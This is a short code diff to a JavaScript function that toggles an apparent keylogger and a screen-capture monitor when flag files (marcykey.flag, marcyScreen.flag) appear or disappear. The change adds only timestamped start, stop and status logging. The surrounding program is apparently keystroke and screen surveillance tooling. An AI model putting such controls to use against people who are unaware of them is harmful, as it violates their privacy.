@@ -78,20 +78,29 @@ function checkAndToggleMonitors() {
     // Keylogger
     const keyFlagExists = fs.existsSync(keyFlag);
     if (keyFlagExists && !keyActive) {
+        console.log(`[${new Date().toISOString()}] Keylogger STARTED - marcykey.flag detected`);
         keyMonitor.start();
         keyActive = true;
     } else if (!keyFlagExists && keyActive) {
+        console.log(`[${new Date().toISOString()}] Keylogger STOPPED - marcykey.flag removed`);
         keyMonitor.stop();
         keyActive = false;
     }
     // Screen
     const screenFlagExists = fs.existsSync(screenFlag);
     if (screenFlagExists && !screenActive) {
+        console.log(`[${new Date().toISOString()}] Screen capture STARTED - marcyScreen.flag detected`);
         screenMonitor.start();
         screenActive = true;
     } else if (!screenFlagExists && screenActive) {
+        console.log(`[${new Date().toISOString()}] Screen capture STOPPED - marcyScreen.flag removed`);
         screenMonitor.stop();
         screenActive = false;
+    }
+    
+    // Log current state every 10 seconds for monitoring
+    if (Date.now() % 10000 < 1000) { // Log roughly every 10 seconds
+        console.log(`[${new Date().toISOString()}] Status - Keylogger: ${keyActive ? 'ACTIVE' : 'INACTIVE'}, Screen: ${screenActive ? 'ACTIVE' : 'INACTIVE'}`);
     }
 }
 
